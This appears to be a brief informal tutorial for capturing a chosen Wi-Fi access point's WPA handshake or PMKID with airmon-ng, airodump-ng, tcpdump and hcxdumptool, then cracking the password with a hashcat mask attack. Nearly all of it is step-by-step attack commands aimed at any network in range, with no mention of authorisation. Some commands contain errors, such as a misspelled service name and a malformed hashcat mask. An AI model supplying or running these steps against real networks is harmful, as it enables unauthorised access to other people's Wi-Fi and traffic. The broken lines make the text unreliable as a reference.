I assume you have already installed hashcat and the CUDA toolkit, so let start. 

In Kali, sudo systemctl stop NetworkManger.service
         sudo systemctl stop wpa_supplicant.service

         sudo airmon-ng start wlan0      #NIC is now in monitor mode

This attack will be a targetted one, so we need to know the MAC address of the AP
         sudo airodump-ng <interface>    #This will show all wireless AP within range,
                                         select your target. Take note of the MAC address(BSSID)
                                         and channel(CH), we will need it.

         sudo tcpdump -s 65535 -y IEEE802_11_RADIO "wlan addr3 ************ or wlan addr3 ffffffffffff" -ddd > filename.bpf
         #The file will be created. 

         sudo hcxdumptool -i <interface> -c <channel(CH)a> --bpf=filename.bpf -w new_filename.pcapng

Now, convert the pcap ng file into a HC 22000 format(newer versions of hashcat)
         sudo hcxpcapngtool -o hash.hc22000 new_filename.pcapng

Once the file is created, move it to windows to crack with hashcat.
         hashcat -a 3 -d 1 -m 22000 hash.hc22000 d?d?d?d?d?d?d?d?d?d (you know what type of password)
